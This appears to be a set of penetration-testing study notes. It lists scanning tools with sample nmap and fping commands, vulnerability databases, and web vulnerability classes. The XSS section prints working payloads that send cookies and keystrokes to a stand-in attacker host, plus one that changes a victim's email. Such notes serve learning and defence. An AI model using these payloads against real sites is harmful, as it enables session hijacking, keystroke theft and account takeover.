Goal:
- Scanning and enumerating target to find possible vulnerability and access point!

Scanning Methods:
- Network Scanning
- Port Scanning
- Vulnerability Scanning

Network Scanning Tools
- [ping]: ICMP Scanning <ping 192.168.0.1>
- [fping]: Live Hosts <fping -g -r 1 192.168.0.0/24>
- [nmap]: Network Scan <nmap -sn 192.168.100.0/24>
- [hping3]: Packet generator
- [arp-scan]
- [masscan]
- [Wireshark]: Network Sniffing and Packet Analysis
- [Zeek]: Network Monitoring
- [Snort]: Intrusion Detection and Prevention
- [NetworkMiner]: Network Forensics
- [Brim]:Threat Hunting


Port Scanning Tools
- [nmap]

Vulnerability Scanning Tools and Public Repositories
- [Nessus]
- [Nexpose]
- [OpenVAS]
- [Nikto]
- [searchsploit]
- [ExploitDB] <https://www.exploit-db.com>
- [NVD] <https://nvd.nist.gov/vuln/search>
- [Mitre] <https://www.cve.org>
- [OVAL] <https://oval.cisecurity.org/repository>
- [rapid7] <https://www.rapid7.com/db/>
- [favicon] <https://wiki.owasp.org/index.php/OWASP_favicon_database>


Web Applicatin Vulnerability:
- [IDOR]: Insecure Direct Object Reference
    - plain
    - base64 <https://www.base64decode.org/>
    - hash <https://crackstation.net/>
    - Unpredictable
- [FI]: File inclusion
    - Local File Inclusion
    - Remote File Inclusion
- [PT]: Path Traversal
- [SSRF]: Server-Side Request Forgery
    - regular SSRF
    - Blind SSRF
- [XSS]: Cross-site Scripting
    - Proof Of Concept <script>alert('XSS');</script>
    - Session Stealing <script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>
    - Key Logger <script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>
    - Business Logic <script>user.changeEmail('attacker@hacker.thm');</script>
- [RCE]: Remote Code Execution
- [SQLi]: SQL Injection
